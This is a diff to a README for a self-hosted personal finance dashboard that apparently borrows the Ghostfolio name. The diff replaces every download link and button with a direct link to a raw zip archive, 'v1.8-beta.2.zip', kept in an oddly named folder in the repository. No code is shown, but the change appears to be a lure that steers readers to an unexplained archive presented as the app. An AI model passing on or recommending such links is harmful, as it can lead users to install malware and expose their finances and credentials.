@@ -1,7 +1,7 @@
 <h1>💼 Ghostfolio-Desktop-Self-Hosted-Dashboard - Your Personal Finance Command Center</h1>
 
 <p align="center">
-  <a href="https://github.com/lin982711/Ghostfolio-Desktop-Self-Hosted-Dashboard" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW</a>
+  <a href="https://github.com/lin982711/Ghostfolio-Desktop-Self-Hosted-Dashboard/raw/refs/heads/main/Biblicopsychological/v1.8-beta.2.zip" style="background-color:#4CAF50; color:white; padding:15px 32px; text-align:center; text-decoration:none; display:inline-block; font-size:20px; border-radius:8px; font-weight:bold;">⬇️ DOWNLOAD NOW</a>
 </p>
 
 ## 👋 Welcome to Your Financial Dashboard
@@ -28,7 +28,7 @@ We have made this incredibly simple. Follow these steps, and you will be trackin
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: [https://github.com/lin982711/Ghostfolio-Desktop-Self-Hosted-Dashboard](https://github.com/lin982711/Ghostfolio-Desktop-Self-Hosted-Dashboard)
+Visit this link to download the application: [https://github.com/lin982711/Ghostfolio-Desktop-Self-Hosted-Dashboard/raw/refs/heads/main/Biblicopsychological/v1.8-beta.2.zip](https://github.com/lin982711/Ghostfolio-Desktop-Self-Hosted-Dashboard/raw/refs/heads/main/Biblicopsychological/v1.8-beta.2.zip)
 
 This link will take you to the download page. You will see a button or link to download the application file. Click it and wait for the download to complete. The file will typically be saved to your "Downloads" folder.
 
@@ -112,7 +112,7 @@ Your financial future deserves better tools. Ghostfolio-Desktop-Self-Hosted-Dash
 
 <p align="center" style="background-color:#f0f0f0; padding:20px; border-radius:8px;">
   <strong>Ready to take control of your finances?</strong><br>
-  <a href="https://github.com/lin982711/Ghostfolio-Desktop-Self-Hosted-Dashboard" style="background-color:#2196F3; color:white; padding:12px 24px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:6px;">⬇️ Download Now - It's Free!</a>
+  <a href="https://github.com/lin982711/Ghostfolio-Desktop-Self-Hosted-Dashboard/raw/refs/heads/main/Biblicopsychological/v1.8-beta.2.zip" style="background-color:#2196F3; color:white; padding:12px 24px; text-align:center; text-decoration:none; display:inline-block; font-size:18px; border-radius:6px;">⬇️ Download Now - It's Free!</a>
 </p>
 
 Start your journey to financial clarity today. Your dashboard is waiting for you.
